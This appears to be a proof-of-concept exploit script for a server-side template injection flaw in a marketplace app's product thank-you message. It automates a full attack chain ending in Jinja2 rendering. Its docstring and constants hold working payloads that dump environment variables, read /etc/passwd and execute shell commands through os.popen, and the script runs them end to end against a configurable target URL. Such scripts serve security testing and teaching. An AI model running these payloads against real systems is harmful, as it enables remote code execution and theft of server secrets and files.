#!/usr/bin/env python3
"""
SSTI-1 — Server-Side Template Injection via Product Thank-You Message
Endpoints: POST /api/products  (store payload)
           PUT  /api/orders/{id}/complete  (trigger — Jinja2 renders the message)
Auth     : Seller to plant payload; buyer to trigger

When a buyer marks an order as complete, the backend renders each
product's `thank_you_message` using Jinja2:

    jinja2.Template(item.product.thank_you_message).render(
        order_id=..., buyer=..., total=...
    )

`thank_you_message` is seller-controlled. Jinja2's default environment
allows arbitrary expression evaluation, including accessing Python's
class hierarchy to reach OS-level primitives.

The rendered output is returned in the `seller_message` field of the
order completion response — making this a *reflected* SSTI (full output
of the injected expression is returned to the caller).

Payloads
--------
  Proof (safe):
    {{ 7 * 7 }}   →  "49"

  Read environment variables:
    {{ cycler.__init__.__globals__.os.environ }}

  Read arbitrary file:
    {{ cycler.__init__.__globals__.__builtins__['open']('/etc/passwd').read() }}

  Remote code execution:
    {{ cycler.__init__.__globals__.os.popen('id').read() }}

  (cycler is a Jinja2 built-in whose __init__.__globals__ includes the os
   module — no subclass index guessing required, works on any Python version)

Usage
-----
    python poc_019_ssti_order_confirmation.py
    python poc_019_ssti_order_confirmation.py --url http://localhost:8000
    python poc_019_ssti_order_confirmation.py --payload "{{ 7*7 }}"
"""

import argparse
import sys
import requests

SELLER_EMAIL      = "alice@mercury.com"
SELLER_PASSWORD   = "Seller123!"
BUYER_EMAIL       = "charlie@mercury.com"
BUYER_PASSWORD    = "Buyer123!"

PROOF_PAYLOAD     = "Thank you {{ buyer }}! Order #{{ order_id }} — Total: ${{ total }} — Proof: {{ 7 * 7 }}"
ENUM_PAYLOAD      = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
RCE_PAYLOAD       = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"


def banner():
    print("=" * 60)
    print("  SSTI-1 — SSTI via Product Thank-You Message (Jinja2)")
    print("  Store: POST /api/products")
    print("  Trigger: PUT /api/orders/{id}/complete")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {email}"); sys.exit(1)
    return token


def create_product(base_url, token, payload):
    resp = requests.post(
        f"{base_url}/api/products",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "title": "Exclusive Digital Template Pack",
            "description": "Premium collection.",
            "price": 1.00,
            "quantity": 99,
            "category": "Software",
            "product_type": "digital",
            "thank_you_message": payload,
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["id"]


def ensure_balance(base_url, token, amount=50.0):
    wallet = requests.get(f"{base_url}/api/wallet",
                          headers={"Authorization": f"Bearer {token}"}, timeout=10).json()
    if wallet.get("balance", 0) < amount:
        requests.post(f"{base_url}/api/wallet/deposit",
                      headers={"Authorization": f"Bearer {token}"},
                      json={"amount": amount, "payment_method": "card"}, timeout=10)


def place_order(base_url, token, product_id):
    resp = requests.post(
        f"{base_url}/api/orders",
        headers={"Authorization": f"Bearer {token}"},
        json={"items": [{"product_id": product_id, "quantity": 1}]},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["id"]


def ship_order(base_url, seller_token, order_id):
    resp = requests.put(
        f"{base_url}/api/orders/{order_id}/ship",
        headers={"Authorization": f"Bearer {seller_token}"},
        json={"tracking_number": "SSTI-DEMO-001"},
        timeout=10,
    )
    resp.raise_for_status()


def confirm_delivery(base_url, buyer_token, order_id):
    resp = requests.put(
        f"{base_url}/api/orders/{order_id}/confirm-delivery",
        headers={"Authorization": f"Bearer {buyer_token}"},
        timeout=10,
    )
    resp.raise_for_status()


def complete_order(base_url, buyer_token, order_id):
    """Trigger — Jinja2 renders thank_you_message here."""
    resp = requests.put(
        f"{base_url}/api/orders/{order_id}/complete",
        headers={"Authorization": f"Bearer {buyer_token}"},
        timeout=10,
    )
    return resp


def run_demo(base_url, payload, label):
    print(f"\n[*] {label}")
    print(f"    Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

    seller_token = login(base_url, SELLER_EMAIL, SELLER_PASSWORD)
    buyer_token  = login(base_url, BUYER_EMAIL,  BUYER_PASSWORD)

    product_id = create_product(base_url, seller_token, payload)
    print(f"    [+] Product created (id={product_id}) with malicious thank_you_message")

    ensure_balance(base_url, buyer_token)
    order_id = place_order(base_url, buyer_token, product_id)
    print(f"    [+] Order placed (id={order_id})")

    ship_order(base_url, seller_token, order_id)
    print(f"    [+] Order shipped")

    confirm_delivery(base_url, buyer_token, order_id)
    print(f"    [+] Delivery confirmed")

    resp = complete_order(base_url, buyer_token, order_id)
    if resp.status_code == 200:
        seller_message = resp.json().get("seller_message", "")
        print(f"    [+] Order completed — seller_message returned:")
        print(f"        {seller_message}")
    else:
        print(f"    [-] {resp.status_code}: {resp.text[:300]}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--payload", default=None,
                        help="Jinja2 SSTI payload for thank_you_message (default: runs full demo)")
    args = parser.parse_args()

    banner()
    print(f"[*] Target: {args.url}")

    if args.payload:
        run_demo(args.url, args.payload, "Custom payload")
    else:
        run_demo(args.url, PROOF_PAYLOAD, "Step 1 — Proof of concept ({{ 7 * 7 }})")
        run_demo(args.url, ENUM_PAYLOAD,  "Step 2 — Enumerate Python subclasses")
        run_demo(args.url, RCE_PAYLOAD,   "Step 3 — Remote code execution via os.popen('id')")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
